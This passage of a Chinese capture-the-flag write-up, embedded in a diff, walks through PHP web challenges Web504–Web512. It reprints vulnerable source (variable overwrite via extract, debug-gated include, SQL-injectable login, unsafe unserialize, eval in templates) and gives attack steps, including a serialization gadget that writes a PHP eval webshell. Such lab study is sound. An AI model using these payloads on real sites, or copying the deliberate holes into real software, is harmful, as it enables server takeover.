+			return $result-&amp;gt;fetch_assoc();
+		&amp;#125;
+	&amp;#125;
+	public function update_one($sql)&amp;#123;
+		$this-&amp;gt;sql=$sql;
+		$conn = db::getConnection();
+		$this-&amp;gt;db-&amp;gt;query($sql);
+		return $this-&amp;gt;db-&amp;gt;affected_rows;
+	&amp;#125;
+
+	public function __destruct()&amp;#123;
+		$this-&amp;gt;log-&amp;gt;log($this-&amp;gt;sql);
+	&amp;#125;
+&amp;#125;
+class dbLog&amp;#123;
+	public $sql;
+	public $content;
+	public $log;
+
+	public function __construct()&amp;#123;
+		$this-&amp;gt;log=&#39;log/&#39;.date_format(date_create(),&amp;quot;Y-m-d&amp;quot;).&#39;.txt&#39;;
+	&amp;#125;
+	public function log($sql)&amp;#123;
+		$this-&amp;gt;content = $this-&amp;gt;content.date_format(date_create(),&amp;quot;Y-m-d-H-i-s&amp;quot;).&#39; &#39;.$sql.&#39; \r\n&#39;;
+	&amp;#125;
+	public function __destruct()&amp;#123;
+		file_put_contents($this-&amp;gt;log, $this-&amp;gt;content,FILE_APPEND);
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里去触发一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720092359793.png&#34; alt=&#34;image-20230720092359793&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里我上传的文件名是 1.png，这里 md 加密的也是 1.png&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720092446415.png&#34; alt=&#34;image-20230720092446415&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;连接一句话&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720092332023.png&#34; alt=&#34;image-20230720092332023&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web504&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web504&#34;&gt;#&lt;/a&gt; Web504&lt;/h2&gt;
+&lt;p&gt;万能密码到是一直能用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720093106360.png&#34; alt=&#34;image-20230720093106360&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里看到新加入了功能，但是这题的文件读取不能用了，突破口肯定在新加入的功能&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720093820420.png&#34; alt=&#34;image-20230720093820420&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;看到这里有查看和下载，猜想有可能存在任意文件读取和任意文件下载，但是在测试的过程中都失败了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720093913861.png&#34; alt=&#34;image-20230720093913861&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;看到新增模块，模块名称也是可控的，这里测试了一下，好像是限制了 php，这里想要使用 user.ini 和.htaccess 文件，经过测试也不行&lt;/p&gt;
+&lt;p&gt;回想之前有一个序列化的点，setting 文件中的内容会被序列化读出，可以覆盖其内容&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+class dblog&amp;#123;
+    public $content=&#39;&amp;lt;?php @eval($_POST[a]);?&amp;gt;&#39;;
+    public $log=&amp;quot;1.php&amp;quot;;
+
+    public function __destruct()&amp;#123;
+        file_put_contents($this-&amp;gt;content,$this-&amp;gt;log);
+    &amp;#125;
+&amp;#125;
+echo (serialize(new dblog()));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720100320209.png&#34; alt=&#34;image-20230720100320209&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720100430441.png&#34; alt=&#34;image-20230720100430441&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web505&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web505&#34;&gt;#&lt;/a&gt; Web505&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720100500954.png&#34; alt=&#34;image-20230720100500954&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;某多多的既视感 \(&lt;sup&gt;o&lt;/sup&gt;)/~&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720100732604.png&#34; alt=&#34;image-20230720100732604&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;又加了一个功能，老套路了&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720100812596.png&#34; alt=&#34;image-20230720100812596&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;任意文件读取换地方了 (*&lt;sup&gt;▽&lt;/sup&gt;*)，先读一下本文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+
+	extract($_POST);
+	if($debug==1 &amp;amp;&amp;amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&amp;#123;
+		include($f);
+	&amp;#125;else&amp;#123;
+		$ret[&#39;data&#39;]=array(&#39;contents&#39;=&amp;gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));
+	&amp;#125;
+	$ret[&#39;msg&#39;]=&#39;查看成功&#39;;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720101352530.png&#34; alt=&#34;image-20230720101352530&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;变量覆盖，include 齐活了，先通过新增模块写一个一句话，再用这个 include 包含，新增的文件开头要有 user&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720101742454.png&#34; alt=&#34;image-20230720101742454&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720101942658.png&#34; alt=&#34;image-20230720101942658&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web506&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web506&#34;&gt;#&lt;/a&gt; Web506&lt;/h2&gt;
+&lt;p&gt;没有加新功能&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+
+	extract($_POST);
+	$ext = substr($f, strlen($f)-3,3);
+	if(preg_match(&#39;/php|sml|phar/i&#39;, $ext))&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;
+		die(json_encode($ret));
+	&amp;#125;
+	if($debug==1 &amp;amp;&amp;amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&amp;#123;
+		include($f);
+	&amp;#125;else&amp;#123;
+		$ret[&#39;data&#39;]=array(&#39;contents&#39;=&amp;gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));
+	&amp;#125;
+	$ret[&#39;msg&#39;]=&#39;查看成功&#39;;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;对 f 传入的名字做了一个判断，但是没有影响，include 不认文件名，改一下上传的文件名不用 php|sml|phar 这三个扩展名就行，其他的没变化&lt;/p&gt;
+&lt;h2 id=&#34;web511&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web511&#34;&gt;#&lt;/a&gt; Web511&lt;/h2&gt;
+&lt;p&gt;登录后通过文件查看模块将文件都 down 下来&lt;/p&gt;
+&lt;p&gt;/index.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+include(&#39;render/render_class.php&#39;);
+include(&#39;render/db_class.php&#39;);
+
+
+$action=$_GET[&#39;action&#39;];
+
+
+if(!isset($action))&amp;#123;
+	if(isset($_COOKIE[&#39;user&#39;]))&amp;#123;
+		$c=$_COOKIE[&#39;user&#39;];
+		if(!preg_match(&#39;/\:|\,/&#39;, $c))&amp;#123;
+			$user=unserialize($c);
+		&amp;#125;
+		if($user)&amp;#123;
+			templateUtil::render(&#39;index&#39;);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+	&amp;#125;else&amp;#123;
+		header(&#39;location:index.php?action=login&#39;);
+	&amp;#125;
+	die();	
+&amp;#125;
+
+switch ($action) &amp;#123;
+	case &#39;check&#39;:
+		extract($_POST);
+		if(!preg_match(&#39;/file|or|innodb|sys|mysql/i&#39;, $username))&amp;#123;
+			$sql = &amp;quot;select username,nickname,avatar from user where username = &#39;&amp;quot;.$username.&amp;quot;&#39; and password=&#39;&amp;quot;.md5($password).&amp;quot;&#39; order by id limit 1&amp;quot;;
+			$db=new db();
+			$user=$db-&amp;gt;select_one_array($sql);
+		&amp;#125;
+		if($user)&amp;#123;
+			$_SESSION[&#39;user&#39;]=$user;
+			header(&#39;location:index.php?action=index&#39;);
+		&amp;#125;else&amp;#123;
+			templateUtil::render(&#39;error&#39;);
+		&amp;#125;
+		break;
+	case &#39;clear&#39;:
+		system(&#39;rm -rf cache/*&#39;);
+		die(&#39;cache clear&#39;);
+		break;
+	case &#39;login&#39;:
+		templateUtil::render($action);
+		break;
+	case &#39;index&#39;:
+		$user=$_SESSION[&#39;user&#39;];
+		if($user)&amp;#123;
+			templateUtil::render(&#39;index&#39;,$user);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+		break;
+	case &#39;view&#39;:
+		$user=$_SESSION[&#39;user&#39;];
+		if($user)&amp;#123;
+			templateUtil::render($_GET[&#39;page&#39;],$user);
+		&amp;#125;else&amp;#123;
+			header(&#39;location:index.php?action=login&#39;);
+		&amp;#125;
+		break;
+	case &#39;logout&#39;:
+		session_destroy();
+		header(&#39;location:index.php?action=login&#39;);
+		break;
+	default:
+		templateUtil::render($action);
+		break;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;api/admin_templates.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+include(&#39;../render/db_class.php&#39;);
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+$action=$_GET[&#39;action&#39;];
+if(!isset($user))&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+switch ($action) &amp;#123;
+	case &#39;list&#39;:
+		$sql = &amp;quot;select id,name,type,path,des from templates limit 0,10&amp;quot;;
+		$db=new db();
+		$temps = $db-&amp;gt;select_array($sql);
+		if(count($temps)&amp;gt;0)&amp;#123;
+			$ret[&#39;count&#39;]=count($temps);
+			$ret[&#39;data&#39;]=$temps;
+			$ret[&#39;msg&#39;]=&#39;查询成功&#39;;
+		&amp;#125;
+		break;
+	case &#39;update&#39;:
+		extract($_POST);
+		$row=json_decode($row);
+		if(waf($row))&amp;#123;
+			break;
+		&amp;#125;
+		$sql =&amp;quot;update templates set name=&#39;&amp;#123;$row-&amp;gt;name&amp;#125;&#39;,path=&#39;&amp;#123;$row-&amp;gt;path&amp;#125;&#39;,type=&#39;&amp;#123;$row-&amp;gt;type&amp;#125;&#39;,des=&#39;&amp;#123;$row-&amp;gt;des&amp;#125;&#39; where id =&amp;#123;$row-&amp;gt;id&amp;#125;&amp;quot;;
+		$db = new db();
+		if($db-&amp;gt;update_one($sql))&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;
+		&amp;#125;else&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;
+		&amp;#125;
+		break;
+	case &#39;getContents&#39;:
+		extract($_POST);
+		$template=json_decode($template);
+		if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#39;, $template-&amp;gt;path))&amp;#123;
+			$ret[&#39;count&#39;]=1;
+			$ret[&#39;msg&#39;]=&#39;查询成功&#39;;
+			$ret[&#39;data&#39;]=array(&#39;contents&#39;=&amp;gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&amp;gt;path)));
+		&amp;#125;
+		break;
+	case &#39;download&#39;:
+		extract($_POST);
+		if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#39;, $path))&amp;#123;
+			header(&amp;quot;Content-Type: application/octet-stream&amp;quot;); 
+			header(&#39;Content-Disposition:  attachment; filename=&amp;quot;&#39; . $path. &#39;&amp;quot;&#39;);
+			echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);
+			exit();
+		&amp;#125;
+		break;
+	case &#39;upload&#39;:
+		extract($_POST);
+		if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))
+		&amp;#123;	
+			if(preg_match(&#39;/&amp;lt;|&amp;gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&amp;#123;
+				$ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
+			&amp;#125;else&amp;#123;
+				file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);
+				$ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;
+			&amp;#125;
+			
+		&amp;#125;else&amp;#123;
+			$ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
+		&amp;#125;
+		break;
+	default:
+		# code...
+		break;
+&amp;#125;
+
+function waf($row)&amp;#123;
+	$ret = false;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;name))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;type))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;des))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;path))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&amp;gt;id))&amp;#123;
+		$ret=true;
+	&amp;#125;
+	return $ret;
+&amp;#125;
+die(json_encode($ret));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;api/admin_edit.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+session_start();
+include(&#39;../render/db_class.php&#39;);
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+	if(preg_match(&#39;/\&#39;|\&amp;quot;|\\\/&#39;, $avatar))&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;
+		die(json_encode($ret));
+	&amp;#125;
+	$sql = &amp;quot;update user set nickname=&#39;&amp;quot;.substr($nickname, 0,8).&amp;quot;&#39;,avatar=&#39;&amp;quot;.$avatar.&amp;quot;&#39; where username=&#39;&amp;quot;.substr($user[&#39;username&#39;],0,8).&amp;quot;&#39;&amp;quot;;
+	$db=new db();
+	if($db-&amp;gt;update_one($sql))&amp;#123;
+		$_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;
+		$_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;
+		$ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
+	&amp;#125;else&amp;#123;
+		$ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;
+	&amp;#125;
+	die(json_encode($ret));
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;api/admin_file_view.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+session_start();
+
+error_reporting(0);
+$user= $_SESSION[&#39;user&#39;];
+$ret = array(
+		&amp;quot;code&amp;quot;=&amp;gt;0,
+		&amp;quot;msg&amp;quot;=&amp;gt;&amp;quot;查询失败&amp;quot;,
+		&amp;quot;count&amp;quot;=&amp;gt;0,
+		&amp;quot;data&amp;quot;=&amp;gt;array()
+	);
+if($user)&amp;#123;
+	extract($_POST);
+        if(preg_match(&#39;/php|sml|phar|\:|data|file|sess/i&#39;, $f))&amp;#123;
+                $ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;
+                die(json_encode($ret));
+        &amp;#125;
+        if($debug==1 &amp;amp;&amp;amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&amp;#123;
+                include($f);
+        &amp;#125;else&amp;#123;
+                $ret[&#39;data&#39;]=array(&#39;contents&#39;=&amp;gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));
+        &amp;#125;
+        $ret[&#39;msg&#39;]=&#39;查看成功&#39;;
+        die(json_encode($ret));
+
+
+&amp;#125;else&amp;#123;
+	$ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
+	die(json_encode($ret));
+&amp;#125;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;render/render_class.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		$templateContent=templateUtil::checkImage($templateContent,$arg);
+		$templateContent=templateUtil::checkConfig($templateContent);
+		$templateContent=templateUtil::checkVar($templateContent,$arg);
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkImage($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(preg_match(&#39;/gopher|file/i&#39;, $value))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, &#39;&#39;, $templateContent);
+			&amp;#125;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$encode=&#39;&#39;;
+				if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&amp;#123;
+					$encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
+				&amp;#125;else&amp;#123;
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
+					file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
+				&amp;#125;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $encode, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+	public static function checkConfig($templateContent)&amp;#123;
+		$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
+		foreach ($config as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkVar($templateContent,$arg)&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				eval(&#39;$v=&#39;.$value.&#39;;&#39;);
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $v, $templateContent);
+			&amp;#125;
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;现在 phpstorm 将文件目录结构建立，可以看到 checkVar 中有一个 eval&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720110517383.png&#34; alt=&#34;image-20230720110517383&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着寻找调用 checkVar 的地方，同一个文件下看到 shade 有调用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720110620554.png&#34; alt=&#34;image-20230720110620554&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着往回找&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720110710402.png&#34; alt=&#34;image-20230720110710402&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720110756793.png&#34; alt=&#34;image-20230720110756793&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里只有两处有 arg 参数的调用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720110900718.png&#34; alt=&#34;image-20230720110900718&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;而且这里的参数都是从 session 中拿到，这里只要能控制 user 就可以了，登录的时候注入进去即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720124334479.png&#34; alt=&#34;image-20230720124334479&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720112425580.png&#34; alt=&#34;image-20230720112425580&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里只要上传一个包含&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;&amp;#123;&amp;#123;var:&#39;$key.&#39;&amp;#125;&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;的文件，且不在第一个位置即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720124354300.png&#34; alt=&#34;image-20230720124354300&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720124409658.png&#34; alt=&#34;image-20230720124409658&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;读 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720124430460.png&#34; alt=&#34;image-20230720124430460&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web512&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web512&#34;&gt;#&lt;/a&gt; Web512&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+include(&#39;file_class.php&#39;);
+include(&#39;cache_class.php&#39;);
+
+class templateUtil &amp;#123;
+	public static function render($template,$arg=array())&amp;#123;
+		$templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
+		$cache=templateUtil::shade($templateContent,$arg);
+		echo $cache;
+	&amp;#125;
+	public static  function shade($templateContent,$arg=array())&amp;#123;
+		$templateContent=templateUtil::checkImage($templateContent,$arg);
+		$templateContent=templateUtil::checkConfig($templateContent);
+		$templateContent=templateUtil::checkVar($templateContent,$arg);
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			$templateContent=str_replace(&#39;&amp;#123;&amp;#123;&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkImage($templateContent,$arg=array())&amp;#123;
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(preg_match(&#39;/gopher|file/i&#39;, $value))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, &#39;&#39;, $templateContent);
+			&amp;#125;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$encode=&#39;&#39;;
+				if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&amp;#123;
+					$encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
+				&amp;#125;else&amp;#123;
+					$ch=curl_init($value);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+					$result=curl_exec($ch);
+					curl_close($ch);
+					$ret=chunk_split(base64_encode($result));
+					$encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
+					file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
+				&amp;#125;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;img:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $encode, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+	public static function checkConfig($templateContent)&amp;#123;
+		$config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
+		foreach ($config as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				$templateContent=str_replace(&#39;&amp;#123;&amp;#123;config:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $value, $templateContent);
+			&amp;#125;
+			
+		&amp;#125;
+		return $templateContent;
+	&amp;#125;
+
+	public static function checkVar($templateContent,$arg)&amp;#123;
+		$db=new db();
+		foreach ($arg as $key =&amp;gt; $value) &amp;#123;
+			if(stripos($templateContent, &#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;))&amp;#123;
+				if(!preg_match(&#39;/\(|\[|\`|\&#39;|\&amp;quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|require|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&amp;#123;
+					eval(&#39;$v=&#39;.$value.&#39;;&#39;);
+					$templateContent=str_replace(&#39;&amp;#123;&amp;#123;var:&#39;.$key.&#39;&amp;#125;&amp;#125;&#39;, $v, $templateContent);
+				&amp;#125;
